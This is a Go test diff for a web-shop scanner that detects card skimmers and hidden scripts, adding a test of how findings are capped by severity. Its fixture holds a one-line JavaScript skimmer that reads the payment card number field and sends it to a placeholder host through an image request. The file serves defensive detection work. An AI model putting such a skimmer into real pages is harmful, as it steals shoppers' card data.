@@ -3,6 +3,8 @@ package web
 import (
 	"context"
 	"fmt"
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 
@@ -46,6 +48,46 @@ func TestSkimmerSearchStopsWithTheRun(t *testing.T) {
 	s.inspectCandidates(ctx, skimmerCandidates{others: []FileChange{{Path: "/var/www/shop/a.js"}, {Path: "/var/www/shop/b.js"}}, count: 2})
 	if len(s.issues) != 1 || !strings.Contains(s.issues[0], "2 changed scripts not read for skimmers") {
 		t.Errorf("issues = %q", s.issues)
+	}
+}
+
+// Findings that raise no alert have a bound of their own, and past the bound a more severe
+// finding takes the place of a less severe one; a skimmer left out leaves its script pending.
+func TestFindingBoundsBySeverity(t *testing.T) {
+	root := t.TempDir()
+	skim := "var f=document.querySelector('[name=\"payment[cc_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value"
+	if err := os.WriteFile(filepath.Join(root, "app.js"), []byte(skim), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	entries, err := os.ReadDir(root)
+	if err != nil {
+		t.Fatal(err)
+	}
+	e := entries[0]
+	fill := func(kind string, n int) *scanner {
+		s := &scanner{src: collector.NewSource(root), budget: newHashBudget(), findings: map[string]int{}}
+		for i := range n {
+			s.add(kind, fmt.Sprintf("d/%d", i), e, nil)
+		}
+		return s
+	}
+	quiet := fill(KindExternalSymlink, maxQuietFindings+5)
+	if quiet.add(KindHiddenScript, "x.php", e, nil) == nil || quiet.report.Truncated || quiet.droppedQuiet != 5 {
+		t.Errorf("quiet findings: truncated %v, dropped %d", quiet.report.Truncated, quiet.droppedQuiet)
+	}
+	high := fill(KindHiddenScript, maxFindingsPerApp)
+	if high.add(KindSignature, "w.php", e, []string{"eval"}) == nil || high.alerting != maxFindingsPerApp || high.dropped != 1 || !high.report.Truncated {
+		t.Errorf("a critical finding past the bound: alerting %d, dropped %d", high.alerting, high.dropped)
+	}
+	if _, seen := high.findings[KindHiddenScript+"\x00d/0"]; seen {
+		t.Error("the finding taken out is still indexed")
+	}
+	if high.add(KindHiddenInData, "m", e, nil) != nil {
+		t.Error("a less severe finding took a place")
+	}
+	critical := fill(KindSignature, maxFindingsPerApp)
+	if critical.inspectChanged(context.Background(), FileChange{Path: "/app.js"}) {
+		t.Error("a skimmer left out by the bound was taken as read")
 	}
 }
 
